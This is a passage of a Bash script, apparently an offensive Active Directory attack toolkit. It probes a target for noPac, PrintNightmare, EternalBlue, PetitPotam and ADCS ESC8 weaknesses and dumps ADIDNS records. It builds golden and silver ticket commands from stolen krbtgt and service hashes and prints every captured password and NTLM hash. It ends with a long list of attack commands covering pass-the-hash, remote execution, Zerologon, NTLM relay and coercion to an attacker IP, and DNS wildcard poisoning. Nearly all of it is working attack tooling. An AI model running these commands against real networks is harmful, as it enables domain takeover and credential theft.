            warn "  python3 noPac.py $DOMAIN/$DUMP_USER:'$DUMP_PASS' -dc-ip $TARGET -shell --impersonate administrator"
        else
            ok "noPac: MachineAccountQuota=0 or not readable — likely not vulnerable"
        fi
    fi

    # netexec noPac scanner
    if command -v netexec &>/dev/null; then
        info "  netexec noPac module..."
        netexec smb "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -M nopac \
            2>/dev/null | tee "$OUTDIR/misc/cves/nopac_nxc.txt"
        grep -qi "vulnerable\|NOPAC\|\[\+\]" "$OUTDIR/misc/cves/nopac_nxc.txt" 2>/dev/null && \
            crit "★ noPac MODULE TRIGGERED — verify manually!"
    fi
else
    warn "noPac check requires credentials (-u user -p pass)"
fi

# ★ PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
sep; info "★ CVE-2021-1675/34527 PrintNightmare check..."
if command -v netexec &>/dev/null && [[ -n "$DUMP_USER" ]]; then
    netexec smb "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -M printnightmare \
        2>/dev/null | tee "$OUTDIR/misc/cves/printnightmare.txt"
    grep -qi "vulnerable\|\[\+\]" "$OUTDIR/misc/cves/printnightmare.txt" 2>/dev/null && \
        crit "★ PRINTNIGHTMARE VULNERABLE!"
fi

# ★ MS17-010 / EternalBlue quick check (for legacy DCs)
sep; info "★ MS17-010 EternalBlue check (legacy DC detection)..."
nmap -p445 --script smb-vuln-ms17-010 "$TARGET" -T4 2>/dev/null | \
    tee "$OUTDIR/misc/cves/ms17010.txt" | grep -E "VULNERABLE|State" | head -5
grep -qi "VULNERABLE" "$OUTDIR/misc/cves/ms17010.txt" 2>/dev/null && \
    crit "★★★ MS17-010 ETERNALBLUE VULNERABLE! ★★★"

# ★ PetitPotam unauthenticated check (CVE-2021-36942 — before patched)
sep; info "★ CVE-2021-36942 PetitPotam (unauthenticated) check..."
if command -v impacket-rpcdump &>/dev/null; then
    impacket-rpcdump "$TARGET" 2>/dev/null | grep -iE "MS-EFSR|c681d488|efsr" | \
        tee "$OUTDIR/misc/cves/petitpotam_rpc.txt"
    [[ -s "$OUTDIR/misc/cves/petitpotam_rpc.txt" ]] && {
        crit "★ MS-EFSR (PetitPotam) RPC endpoint EXPOSED!"
        warn "  python3 PetitPotam.py $ATTACKER_IP $TARGET (unauthenticated on unpatched)"
        warn "  python3 PetitPotam.py -u '$DUMP_USER' -p '$DUMP_PASS' -d $DOMAIN $ATTACKER_IP $TARGET"
    }
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 15 — PASS-THE-TICKET & GOLDEN/SILVER TICKET
# ═══════════════════════════════════════════════════════════════════════════════
phase "15 — PASS-THE-TICKET & GOLDEN/SILVER TICKET"
get_best_cred
mkdir -p "$OUTDIR/misc/tickets"

# Find any .ccache files discovered during enumeration
CCACHE_FILES=$(find "$OUTDIR" -name "*.ccache" 2>/dev/null)
if [[ -n "$CCACHE_FILES" ]]; then
    crit "★ KERBEROS TICKET FILES FOUND:"
    echo "$CCACHE_FILES" | while read -r cc; do
        crit "  → $cc"
        # Use impacket to test ticket
        export KRB5CCNAME="$cc"
        info "    Testing ticket: $cc"
        impacket-klist "$cc" 2>/dev/null | head -10
        ok "Use: export KRB5CCNAME=$cc"
        ok "Then: impacket-psexec -k -no-pass $DOMAIN/$(basename "${cc%%.ccache}")@$TARGET"
    done
fi

# Pass-the-Ticket from NTDS dump (Overpass-the-Hash / Pass-the-Key)
KRBTGT_HASH=$(grep -i "^krbtgt:" "$OUTDIR/hashes/secretsdump.ntds" 2>/dev/null | head -1 | cut -d: -f4)
if [[ -n "$KRBTGT_HASH" ]]; then
    crit "★ KRBTGT HASH AVAILABLE — GOLDEN TICKET POSSIBLE!"
    # Try to get domain SID
    DOMAIN_SID=$(grep -oP 'S-1-5-21-[0-9-]+(?=-\d+\s)' "$OUTDIR/smb/lookupsid.txt" 2>/dev/null | head -1)
    [[ -z "$DOMAIN_SID" ]] && DOMAIN_SID=$(impacket-lookupsid "${DOMAIN:-X}/@$TARGET" -no-pass 2>/dev/null | grep "Domain SID" | grep -oP 'S-1-5-21-[0-9-]+')
    if [[ -n "$DOMAIN_SID" ]]; then
        crit "★ Domain SID: $DOMAIN_SID"
        crit "★ GOLDEN TICKET COMMANDS:"
        warn "  impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator"
        warn "  export KRB5CCNAME=Administrator.ccache"
        warn "  impacket-psexec -k -no-pass $DOMAIN/Administrator@$DC_HOST.$DOMAIN"
    fi
fi

# Silver Ticket guidance (service ticket forgery)
if [[ -s "$OUTDIR/hashes/secretsdump.ntds" ]]; then
    sep; info "★ Silver Ticket guidance (service account hash needed)..."
    # Find computer/service account hashes
    grep -E "\$:" "$OUTDIR/hashes/secretsdump.ntds" 2>/dev/null | head -5 | while IFS=: read -r acct rid lm ntlm rest; do
        [[ -z "$ntlm" || "$ntlm" == "31d6cfe0d16ae931b73c59d7e0c089c0" ]] && continue
        crit "  Computer/Svc account: $acct → $ntlm"
        DOMAIN_SID=$(grep -oP 'S-1-5-21-[0-9-]+(?=-\d+\s)' "$OUTDIR/smb/lookupsid.txt" 2>/dev/null | head -1)
        [[ -n "$DOMAIN_SID" ]] && \
            warn "  Silver Ticket (CIFS): impacket-ticketer -nthash $ntlm -domain-sid $DOMAIN_SID -domain $DOMAIN -spn 'cifs/${acct%%\$*}.$DOMAIN' -user-id 500 Administrator"
    done
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 16 — ADIDNS ENUMERATION & ABUSE
# ═══════════════════════════════════════════════════════════════════════════════
phase "16 — ADIDNS ENUMERATION"
get_best_cred
mkdir -p "$OUTDIR/misc/adidns"

info "★ ADIDNS zone enumeration..."
if command -v adidnsdump &>/dev/null && [[ -n "$DUMP_USER" && -n "$DUMP_PASS" && -n "$DOMAIN" ]]; then
    info "adidnsdump — full DNS zone dump..."
    adidnsdump -u "$DOMAIN\\$DUMP_USER" -p "$DUMP_PASS" "$TARGET" \
        --print-zones 2>/dev/null | tee "$OUTDIR/misc/adidns/zones.txt"
    adidnsdump -u "$DOMAIN\\$DUMP_USER" -p "$DUMP_PASS" "$TARGET" \
        -r 2>/dev/null | tee "$OUTDIR/misc/adidns/records.txt"
    DNS_RECORD_COUNT=$(grep -c "," "$OUTDIR/misc/adidns/records.txt" 2>/dev/null || echo 0)
    ok "ADIDNS records dumped: $DNS_RECORD_COUNT"
    # Look for interesting hostnames (web servers, file shares, backup servers)
    grep -iE "(backup|file|share|web|ftp|mail|exchange|sccm|mgmt|admin|it|dev|staging)" \
        "$OUTDIR/misc/adidns/records.txt" 2>/dev/null | tee "$OUTDIR/misc/adidns/interesting_records.txt"
    INTERESTING=$(wc -l < "$OUTDIR/misc/adidns/interesting_records.txt" 2>/dev/null || echo 0)
    [[ "$INTERESTING" -gt 0 ]] && crit "★ INTERESTING DNS RECORDS: $INTERESTING (see $OUTDIR/misc/adidns/interesting_records.txt)"

    # ADIDNS wildcard check (can add wildcard record as low-priv user)
    warn "★ ADIDNS wildcard abuse (HTB: Outdated/Intelligence technique):"
    warn "  # Check if wildcard * exists in DNS:"
    warn "  dig @$TARGET '*.$DOMAIN'"
    warn "  # Add wildcard as any domain user (default ACL):"
    warn "  python3 dnstool.py -u '$DOMAIN\\\\$DUMP_USER' -p '$DUMP_PASS' -r '*' -a add -t A -d $ATTACKER_IP $TARGET"
    warn "  # Then all DNS lookups for unknown hosts resolve to attacker → NTLM capture"
else
    info "Manual DNS zone dump (anonymous):"
    dig axfr "$DOMAIN" "@$TARGET" 2>/dev/null | tee "$OUTDIR/misc/adidns/axfr_attempt.txt" | head -30
    AXFR_RECORDS=$(grep -c "IN.*A\b" "$OUTDIR/misc/adidns/axfr_attempt.txt" 2>/dev/null || echo 0)
    [[ "$AXFR_RECORDS" -gt 0 ]] && crit "★ DNS ZONE TRANSFER ALLOWED: $AXFR_RECORDS records!" || \
        info "Zone transfer not allowed (expected)"
    [[ -z "$DUMP_USER" ]] && warn "Install adidnsdump + provide creds for full DNS dump: pip3 install adidnsdump"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 17 — ADCS RELAY (ESC8 / HTTP ENDPOINT CHECK)
# ═══════════════════════════════════════════════════════════════════════════════
phase "17 — ADCS RELAY (ESC8) CHECK"
get_best_cred
mkdir -p "$OUTDIR/certs/relay"

info "★ Checking for ADCS HTTP enrollment endpoints (ESC8 relay target)..."
for port in 80 443; do
    echo "$OPEN_PORTS" | grep -q "$port" || continue
    proto="http"; [[ "$port" == "443" ]] && proto="https"
    for ep in "/certsrv" "/certsrv/certfnsh.asp" "/certsrv/certcarc.asp"; do
        RESP=$(curl -sk -o /dev/null -w "%{http_code}" "${proto}://${TARGET}${ep}" 2>/dev/null)
        if [[ "$RESP" == "200" || "$RESP" == "401" || "$RESP" == "403" ]]; then
            crit "★ ADCS ENDPOINT FOUND: ${proto}://${TARGET}${ep} (HTTP $RESP)"
            if [[ "$RESP" == "401" ]]; then
                crit "  → NTLM auth on CA endpoint = ESC8 RELAY POSSIBLE!"
                warn "  ESC8 exploit (relay DC auth to CA to get Domain Admin cert):"
                warn "  # 1. Start relay: impacket-ntlmrelayx -t 'http://$TARGET/certsrv/certfnsh.asp' --adcs --template DomainController"
                warn "  # 2. Coerce DC: coercer coerce -t $TARGET -l $ATTACKER_IP -u '$DUMP_USER' -p '$DUMP_PASS' -d $DOMAIN"
                warn "  # 3. Got .pfx? → certipy-ad auth -pfx dc.pfx -domain $DOMAIN -dc-ip $TARGET"
            fi
        fi
    done
done



# ═══════════════════════════════════════════════════════════════════════════════
#  ★★★ FINAL RESULTS — ALL PASSWORDS & HASHES ★★★
# ═══════════════════════════════════════════════════════════════════════════════
echo ""
echo -e "${RED}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════════════╗"
echo "║                    ★ ★ ★   SCAN COMPLETE   ★ ★ ★                    ║"
echo "╚═══════════════════════════════════════════════════════════════════════╝"
echo -e "${RST}"

# Target Info
echo -e "${WHT}${BOLD}┌─── TARGET ─────────────────────────────────────────────────────────┐${RST}"
printf "${WHT}│${RST} IP         : ${CYN}%-54s${RST}${WHT}│${RST}\n" "$TARGET"
printf "${WHT}│${RST} Domain     : ${CYN}%-54s${RST}${WHT}│${RST}\n" "$DOMAIN"
printf "${WHT}│${RST} DC         : ${CYN}%-54s${RST}${WHT}│${RST}\n" "$DC_HOST"
printf "${WHT}│${RST} Ports      : ${CYN}%-54s${RST}${WHT}│${RST}\n" "$OPEN_PORTS"
UC=$(wc -l < "$USERS_FILE" 2>/dev/null || echo 0)
VC=$(wc -l < "$VALID_USERS" 2>/dev/null || echo 0)
printf "${WHT}│${RST} Users      : ${GRN}%-54s${RST}${WHT}│${RST}\n" "$UC discovered, $VC validated"
echo -e "${WHT}└────────────────────────────────────────────────────────────────────┘${RST}"

# ══ CREDENTIALS ══
CC=$(wc -l < "$CREDS_FILE" 2>/dev/null || echo 0)
echo ""
echo -e "${RED}${BOLD}┌─── ★ PASSWORDS / CREDENTIALS FOUND ($CC) ─────────────────────────┐${RST}"
if [[ -s "$CREDS_FILE" ]]; then
    while IFS=: read -r user pass; do
        printf "${RED}${BOLD}│${RST}  ${GRN}★${RST} ${BOLD}${WHT}%-25s${RST}  →  ${RED}${BOLD}%-32s${RST} ${RED}${BOLD}│${RST}\n" "$user" "$pass"
    done < "$CREDS_FILE"
else
    printf "${RED}│${RST}  ${DIM}%-65s${RST} ${RED}│${RST}\n" "No plaintext credentials discovered"
fi
echo -e "${RED}${BOLD}└────────────────────────────────────────────────────────────────────┘${RST}"

# ══ HASHES ══
echo ""
echo -e "${YEL}${BOLD}┌─── ★ NTLM HASHES EXTRACTED ──────────────────────────────────────┐${RST}"
if [[ -f "$OUTDIR/hashes/secretsdump.ntds" ]]; then
    NC=$(wc -l < "$OUTDIR/hashes/secretsdump.ntds")
    printf "  ${YEL}│${RST}  ${RED}★ NTDS.dit — %-2s domain accounts:                               ${YEL}│${RST}\n" "$NC"
    head -15 "$OUTDIR/hashes/secretsdump.ntds" | while IFS=: read -r acct rid lm ntlm rest; do
        printf "  ${YEL}│${RST}    ${WHT}%-25s${RST} ${CYN}%-32s${RST} ${YEL}│${RST}\n" "$acct" "$ntlm"
    done
    [[ $NC -gt 15 ]] && printf "  ${YEL}│${RST}    ${DIM}... +%-2s more                                            ${YEL}│${RST}\n" "$((NC-15))"
fi
[[ -f "$OUTDIR/hashes/secretsdump.sam" ]] && {
    SC=$(wc -l < "$OUTDIR/hashes/secretsdump.sam")
    printf "  ${YEL}│${RST}  ${RED}★ SAM — %-2s local accounts                                     ${YEL}│${RST}\n" "$SC"
    cat "$OUTDIR/hashes/secretsdump.sam" | while IFS=: read -r a r l n rest; do
        printf "  ${YEL}│${RST}    ${WHT}%-25s${RST} ${CYN}%-32s${RST} ${YEL}│${RST}\n" "$a" "$n"
    done
}
# Kerberos hashes
grep -q "\$krb5asrep\$" "$OUTDIR/hashes/"*.txt 2>/dev/null && AC=$(grep -c "\$krb5asrep\$" "$OUTDIR/hashes/"*.txt 2>/dev/null | awk -F: '{sum+=$2} END {print sum}')
AC=${AC:-0}; AC=$(echo "$AC" | tr -d '[:space:]')
grep -q "\$krb5tgs\$" "$OUTDIR/hashes/"*.txt 2>/dev/null && KC=$(grep -c "\$krb5tgs\$" "$OUTDIR/hashes/"*.txt 2>/dev/null | awk -F: '{sum+=$2} END {print sum}')
KC=${KC:-0}; KC=$(echo "$KC" | tr -d '[:space:]')
[[ "$AC" -gt 0 ]] 2>/dev/null && printf "  ${YEL}│${RST}  ${MAG}★ AS-REP: %-2s hashes discovered                              ${YEL}│${RST}\n" "$AC"
[[ "$KC" -gt 0 ]] 2>/dev/null && printf "  ${YEL}│${RST}  ${MAG}★ Kerberoast: %-2s hashes discovered                          ${YEL}│${RST}\n" "$KC"

# Custom hashes from LDAP (LAPS, B64, etc.) - Filter out SAM/NTDS
HC=$(grep -vE "^(NTDS|SAM)\|" "$HASHES_FILE" 2>/dev/null | wc -l || echo 0); HC=$(echo "$HC" | tr -d '[:space:]')
if [[ "$HC" -gt 0 ]] 2>/dev/null; then
    printf "  ${YEL}│${RST}  ${MAG}★ Other hashes: %-2s entries                                    ${YEL}│${RST}\n" "$HC"
    grep -vE "^(NTDS|SAM)\|" "$HASHES_FILE" 2>/dev/null | while read -r h; do
        # Truncate if too long
        h_disp=$(echo "$h" | cut -c1-58)
        [[ ${#h} -gt 58 ]] && h_disp="${h_disp}..."
        printf "  ${YEL}│${RST}    ${WHT}%-60s${RST} ${YEL}│${RST}\n" "$h_disp"
    done
fi

[[ ! -f "$OUTDIR/hashes/secretsdump.ntds" && ! -f "$OUTDIR/hashes/secretsdump.sam" && "${AC:-0}" -eq 0 && "${KC:-0}" -eq 0 && "${HC:-0}" -eq 0 ]] 2>/dev/null && \
    echo -e "  ${YEL}│${RST}  ${DIM}No hashes extracted (try with credentials: -u user -p pass)      ${YEL}│${RST}"
echo -e "${YEL}${BOLD}└────────────────────────────────────────────────────────────────────┘${RST}"

# ══ NEXT STEPS ══
echo ""
echo -e "${CYN}${BOLD}┌─── ATTACK COMMANDS ───────────────────────────────────────────────┐${RST}"
echo -e "${CYN}│${RST} Crack NTLM    : ${WHT}hashcat -m 1000 secretsdump.ntds rockyou.txt${RST}"
echo -e "${CYN}│${RST} Crack AS-REP  : ${WHT}hashcat -m 18200 asrep.txt rockyou.txt${RST}"
echo -e "${CYN}│${RST} Crack TGS     : ${WHT}hashcat -m 13100 kerb.txt rockyou.txt${RST}"
echo -e "${CYN}│${RST} Crack NTLMv2  : ${WHT}hashcat -m 5600 ntlmv2.txt rockyou.txt${RST}"
echo -e "${CYN}│${RST} Pass-the-Hash : ${WHT}netexec smb $TARGET -u Administrator -H <HASH>${RST}"
echo -e "${CYN}│${RST} Evil-WinRM    : ${WHT}evil-winrm -i $TARGET -u <user> -H <HASH>${RST}"
echo -e "${CYN}│${RST} PSExec        : ${WHT}impacket-psexec $DOMAIN/admin@$TARGET -hashes <LM:NT>${RST}"
echo -e "${CYN}│${RST} WMIExec       : ${WHT}impacket-wmiexec $DOMAIN/admin@$TARGET -hashes <LM:NT>${RST}"
echo -e "${CYN}│${RST} ATExec        : ${WHT}impacket-atexec $DOMAIN/admin@$TARGET -hashes <LM:NT> whoami${RST}"
echo -e "${CYN}│${RST} SMBExec       : ${WHT}impacket-smbexec $DOMAIN/admin@$TARGET -hashes <LM:NT>${RST}"
echo -e "${CYN}│${RST} Pass-the-Cert : ${WHT}certipy-ad auth -pfx <CERT.pfx> -domain $DOMAIN -dc-ip $TARGET${RST}"
echo -e "${CYN}│${RST} Shadow Cred   : ${WHT}certipy-ad shadow auto -u USER@$DOMAIN -p PASS -account <TARGET> -dc-ip $TARGET${RST}"
echo -e "${CYN}│${RST} WriteOwner    : ${WHT}impacket-owneredit -action write -new-owner <USER> -target <OBJ> $DOMAIN/USER:PASS -dc-ip $TARGET${RST}"
echo -e "${CYN}│${RST} WriteDACL     : ${WHT}impacket-dacledit $DOMAIN/USER:PASS -dc-ip $TARGET -principal USER -target-dn <DN> -action write -rights FullControl${RST}"
echo -e "${CYN}│${RST} GenericWrite  : ${WHT}bloodyAD -d $DOMAIN --host $TARGET -u USER -p PASS set password <TARGET> 'NewPass!'${RST}"
echo -e "${CYN}│${RST} AddMember     : ${WHT}bloodyAD -d $DOMAIN --host $TARGET -u USER -p PASS add groupMember 'Domain Admins' <USER>${RST}"
echo -e "${CYN}│${RST} AddComputer   : ${WHT}impacket-addcomputer $DOMAIN/USER:PASS -computer-name 'FAKE\$' -computer-pass 'Pass123' -dc-ip $TARGET${RST}"
echo -e "${CYN}│${RST} RBCD          : ${WHT}impacket-rbcd $DOMAIN/USER:PASS -delegate-from FAKE\$ -delegate-to TARGET\$ -dc-ip $TARGET -action write${RST}"
echo -e "${CYN}│${RST} S4U2Proxy     : ${WHT}impacket-getST $DOMAIN/SVC:PASS -spn cifs/TARGET.$DOMAIN -impersonate Administrator -dc-ip $TARGET${RST}"
echo -e "${CYN}│${RST} Golden Ticket : ${WHT}impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain $DOMAIN Administrator${RST}"
echo -e "${CYN}│${RST} Silver Ticket : ${WHT}impacket-ticketer -nthash <SVC_HASH> -domain-sid <SID> -domain $DOMAIN -spn cifs/HOST Administrator${RST}"
echo -e "${CYN}│${RST} Pass-Ticket   : ${WHT}export KRB5CCNAME=<ticket.ccache> && impacket-psexec -k -no-pass $DOMAIN/user@$TARGET${RST}"
echo -e "${CYN}│${RST} Overpass-Hash : ${WHT}impacket-getTGT $DOMAIN/USER -hashes :<NT_HASH> -dc-ip $TARGET${RST}"
echo -e "${CYN}│${RST} Zerologon     : ${WHT}impacket-zerologon $DC_HOST $TARGET (CRITICAL — resets machine password!)${RST}"
echo -e "${CYN}│${RST} NTLM Relay    : ${WHT}impacket-ntlmrelayx -t ldap://$TARGET --shadow-credentials --shadow-target 'MACHINE\$'${RST}"
echo -e "${CYN}│${RST} Coerce+Relay  : ${WHT}coercer coerce -t $TARGET -l <ATTACKER_IP> -u USER -p PASS -d $DOMAIN${RST}"
echo -e "${CYN}│${RST} ESC8 Relay    : ${WHT}impacket-ntlmrelayx -t http://$TARGET/certsrv/certfnsh.asp --adcs --template DomainController${RST}"
echo -e "${CYN}│${RST} MSSQL Shell   : ${WHT}impacket-mssqlclient $DOMAIN/USER:PASS@$TARGET -windows-auth${RST}"
echo -e "${CYN}│${RST} DPAPI         : ${WHT}impacket-dpapi backupkeys -t $DOMAIN/USER:PASS@$TARGET --export${RST}"
echo -e "${CYN}│${RST} DNS Wildcard  : ${WHT}python3 dnstool.py -u '$DOMAIN\\USER' -p PASS -r '*' -a add -t A -d <ATTACKER_IP> $TARGET${RST}"
echo -e "${CYN}${BOLD}└────────────────────────────────────────────────────────────────────┘${RST}"
echo ""
echo -e "${GRN}${BOLD}All results → $OUTDIR/${RST}"
echo ""

# Write report
{
    echo ""; echo "=== CREDENTIALS ==="; cat "$CREDS_FILE" 2>/dev/null
    echo ""; echo "=== NTDS HASHES ==="; cat "$OUTDIR/hashes/secretsdump.ntds" 2>/dev/null
    echo ""; echo "=== SAM HASHES ==="; cat "$OUTDIR/hashes/secretsdump.sam" 2>/dev/null
    echo ""; echo "=== TRUSTS ==="; cat "$OUTDIR/misc/trusts/trust_ldap.txt" 2>/dev/null
    echo ""; echo "=== DELEGATION ==="; cat "$OUTDIR/misc/trusts/find_delegation.txt" 2>/dev/null
    echo ""; echo "=== CVE CHECKS ==="; cat "$OUTDIR/misc/cves/zerologon.txt" 2>/dev/null; cat "$OUTDIR/misc/cves/nopac_nxc.txt" 2>/dev/null
    echo ""; echo "=== ADIDNS RECORDS ==="; cat "$OUTDIR/misc/adidns/records.txt" 2>/dev/null
    echo ""; echo "=== MSSQL ==="; cat "$OUTDIR/misc/mssql/nxc_auth.txt" 2>/dev/null
    echo ""; echo "=== ACL FINDINGS ==="; cat "$OUTDIR/misc/acl/nxc_acl.txt" 2>/dev/null
} >> "$OUTDIR/report.txt"

ok "Full report → $OUTDIR/report.txt"
